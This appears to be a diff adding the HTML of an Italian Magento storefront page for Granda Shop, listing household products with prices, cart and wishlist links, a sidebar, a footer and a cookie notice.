+    </div>
+        
+    
+                            <ul class="products-grid">
+                    <li class="item first">
+                <a href="http://www.grandashop.it/tazza-mug-in-ceramica-giraffa/?SID=b44df3305e9e9f909f7942ee18c73c08" title="tazza per colazione giraffa" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/t/a/tazza-leone-verde.jpg" width="135" height="135" alt="tazza per colazione giraffa" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/tazza-mug-in-ceramica-giraffa/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Tazza/ mug in ceramica giraffa">Tazza/ mug in ceramica giraffa</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-33">
+                                            <span class="price">€ 1,99</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/33/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/33/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/33/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.grandashop.it/tappeto-bambino-pista-da-corsa/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Tappetto per bambini &quot;pista da corsa&quot; 100x50" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/t/a/tappeto_pista_da_corsa.jpg" width="135" height="135" alt="Tappetto per bambini &quot;pista da corsa&quot; 100x50" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/tappeto-bambino-pista-da-corsa/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Tappeto bambino &quot;Pista da corsa&quot;">Tappeto bambino &quot;Pista da corsa&quot;</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-28">
+                                            <span class="price">€ 46,00</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/28/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/28/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/28/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.grandashop.it/set-4-tazzine-caffe/?SID=b44df3305e9e9f909f7942ee18c73c08" title="set tazzine caffè" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/3/2/32.02.jpg" width="135" height="135" alt="set tazzine caffè" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/set-4-tazzine-caffe/?SID=b44df3305e9e9f909f7942ee18c73c08" title="SET 4 TAZZINE CAFFE'">SET 4 TAZZINE CAFFE'</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-37">
+                                            <span class="price">€ 9,90</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/37/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/37/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/37/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item last">
+                <a href="http://www.grandashop.it/salvadanaio-ceramica-granchio-cancro-colorato/?SID=b44df3305e9e9f909f7942ee18c73c08" title="SALVADANAIO GRANCHIO" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/0/9/09_4.jpg" width="135" height="135" alt="SALVADANAIO GRANCHIO" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/salvadanaio-ceramica-granchio-cancro-colorato/?SID=b44df3305e9e9f909f7942ee18c73c08" title="SALVADANAIO CERAMICA GRANCHIO/CANCRO COLORATO">SALVADANAIO CERAMICA GRANCHIO/CANCRO COLORATO</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-31">
+                                            <span class="price">€ 10,50</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <p class="availability out-of-stock"><span>Non disponibile</span></p>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/31/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/31/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                </ul>
+                                <ul class="products-grid">
+                    <li class="item first">
+                <a href="http://www.grandashop.it/porta-color-wenge/?SID=b44df3305e9e9f909f7942ee18c73c08" title="porta wengè" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/p/o/porta_colore_rovere_weng__4.jpg" width="135" height="135" alt="porta wengè" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/porta-color-wenge/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Porta color Wengé">Porta color Wengé</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-36">
+                                            <span class="price">€ 193,98</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/36/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/36/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/36/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.grandashop.it/porta-ciliegio-poro-aperto/?SID=b44df3305e9e9f909f7942ee18c73c08" title="porta ciliegio poro aperto" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/i/m/img_3580._1.jpg" width="135" height="135" alt="porta ciliegio poro aperto" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/porta-ciliegio-poro-aperto/?SID=b44df3305e9e9f909f7942ee18c73c08" title="PORTA CILIEGIO PORO APERTO">PORTA CILIEGIO PORO APERTO</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-35">
+                                            <span class="price">€ 193,98</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/35/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/35/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/35/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.grandashop.it/divano-prontoletto-in-tessuto-easy/?SID=b44df3305e9e9f909f7942ee18c73c08" title="prontoletto" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/d/i/divano_letto_easy_vsdhpp41_2.jpg" width="135" height="135" alt="prontoletto" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/divano-prontoletto-in-tessuto-easy/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Divano prontoletto in tessuto Easy">Divano prontoletto in tessuto Easy</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-29">
+                                            <span class="price">€ 250,00</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/29/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/29/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/29/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item last">
+                <a href="http://www.grandashop.it/d-m-profumo-equivalente-a-dolce-gabbana-pour-homme/?SID=b44df3305e9e9f909f7942ee18c73c08" title="d&amp;m profumo ispirato a dolce&amp;gabbana pour homme" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/d/_/d_m_dolce_e_gabbana.jpg" width="135" height="135" alt="d&amp;m profumo ispirato a dolce&amp;gabbana pour homme" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/d-m-profumo-equivalente-a-dolce-gabbana-pour-homme/?SID=b44df3305e9e9f909f7942ee18c73c08" title="D&amp;m profumo equivalente a Dolce &amp; Gabbana pour homme">D&amp;m profumo equivalente a Dolce &amp; Gabbana pour homme</a></h2>
+                                    <div class="ratings">
+                <span class="amount"><a href="#" onclick="var t = opener ? opener.window : window; t.location.href='http://www.grandashop.it/review/product/list/id/34/?SID=b44df3305e9e9f909f7942ee18c73c08'; return false;">1 Recensione(i)</a></span>
+    </div>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-34">
+                                            <span class="price">€ 9,90</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/34/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/34/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/34/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                </ul>
+                        <script type="text/javascript">decorateGeneric($$('ul.products-grid'), ['odd','even','first','last'])</script>
+    
+    <div class="toolbar-bottom">
+        <div class="toolbar">
+    <div class="pager">
+        <p class="amount">
+                            <strong>8 Prodotto/I</strong>
+                    </p>
+
+        <div class="limiter">
+            <label>Mostra</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=8" selected="selected">
+                    8                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=16">
+                    16                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=24">
+                    24                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=32">
+                    32                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=48">
+                    48                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=64">
+                    64                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=all">
+                    Tutto                </option>
+                        </select> per pagina        </div>
+
+        
+    
+    
+    
+    
+    
+
+    </div>
+
+        <div class="sorter">
+                <p class="view-mode">
+                                </p>
+            
+        <div class="sort-by">
+            <label>Sort By</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;dir=asc&amp;order=position">
+                    Posizione                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;dir=asc&amp;order=name" selected="selected">
+                    Nome                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;dir=asc&amp;order=price">
+                    Prezzo                </option>
+                        </select>
+                            <a href="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;dir=asc&amp;order=name" title="Imposta ordine ascendente"><img src="http://www.grandashop.it/skin/frontend/default/blank/images/i_desc_arrow.gif" alt="Imposta ordine ascendente" class="v-middle" /></a>
+                    </div>
+    </div>
+    </div>
+    </div>
+</div>
+                </div>
+                <div class="col-right sidebar"><div class="block block-list block-compare">
+    <div class="block-title">
+        <strong><span>Compare Products                    </span></strong>
+    </div>
+    <div class="block-content">
+            <p class="empty">You have no items to compare.</p>
+        </div>
+</div>
+<div class="block block-cart">
+        <div class="block-title">
+        <strong><span>Carrello</span></strong>
+    </div>
+    <div class="block-content">
+                        <p class="empty">You have no items in your shopping cart.</p>
+        </div>
+</div>
+<div class="block block-banner">
+    <div class="block-content">
+                    <img src="http://www.grandashop.it/skin/frontend/default/default/images/media/col_right_callout.jpg" title="Tieni gli occhi aperti per i nostri speciali articoli Torna a Scuola e risparmia MOLTISSIMO!" alt="Tieni gli occhi aperti per i nostri speciali articoli Torna a Scuola e risparmia MOLTISSIMO!" />
+            </div>
+</div>
+<div class="paypal-logo">
+    <a href="#" title="Additional Options" onclick="javascript:window.open('https://www.paypal.com/it/cgi-bin/webscr?cmd=xpt/Marketing/popup/OLCWhatIsPayPal-outside','paypal','width=600,height=350,left=0,top=0,location=no,status=yes,scrollbars=yes,resizable=yes'); return false;"><img src="https://www.paypalobjects.com/it_IT/i/bnr/bnr_nowAccepting_150x60.gif" alt="Additional Options" title="Additional Options" /></a>
+</div>
+</div>
+            </div>
+        </div>
+        <div class="footer-container">
+    <div class="footer">
+        <ul>
+<li><a href="http://www.grandashop.it/about-magento-demo-store?SID=b44df3305e9e9f909f7942ee18c73c08">About Us</a></li>
+<li><a href="http://www.grandashop.it/customer-service?SID=b44df3305e9e9f909f7942ee18c73c08">Customer Service</a></li>
+<li class="last privacy"><a href="http://www.grandashop.it/privacy-policy-cookie-restriction-mode?SID=b44df3305e9e9f909f7942ee18c73c08">Privacy Policy</a></li>
+</ul><ul class="links">
+                        <li class="first" ><a href="http://www.grandashop.it/catalog/seo_sitemap/category/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Site Map" >Site Map</a></li>
+                                <li ><a href="http://www.grandashop.it/catalogsearch/term/popular/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Condizioni Ricerca" >Condizioni Ricerca</a></li>
+                                <li ><a href="http://www.grandashop.it/catalogsearch/advanced/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Advanced Search" >Advanced Search</a></li>
+                                <li ><a href="http://www.grandashop.it/sales/guest/form/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Orders and Returns" >Orders and Returns</a></li>
+                                <li class=" last" ><a href="http://www.grandashop.it/contacts/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Contact Us" >Contact Us</a></li>
+            </ul>
+        <p class="bugs">Help Us to Keep Magento Healthy - <a href="http://www.magentocommerce.com/bug-tracking" onclick="this.target='_blank'"><strong>Report All Bugs</strong></a> (ver. 1.8.1.0)</p>
+        <address>&copy; 2013 Magento Demo Store. All Rights Reserved.
+
+&copy; <script type="text/javascript">var mdate = new Date(); document.write(mdate.getFullYear());</script> Granda Shop P.iva 03207420047</address>
+    </div>
+</div>
+                
+
+    </div>
+</div>
+<div id="cookiebox" class="cookie-box">
+ <p class="cookie-msg">Questo sito utilizza i cookies. Proseguendo nella navigazione, accetti le condizioni.</p>
+ <a href="http://www.grandashop.it/informativa-cookies">Ulteriori Informazioni</a><button on onclick=" document.getElementById('cookiebox').style.display = 'none';">OK</button>
+</div></body>
+</html>
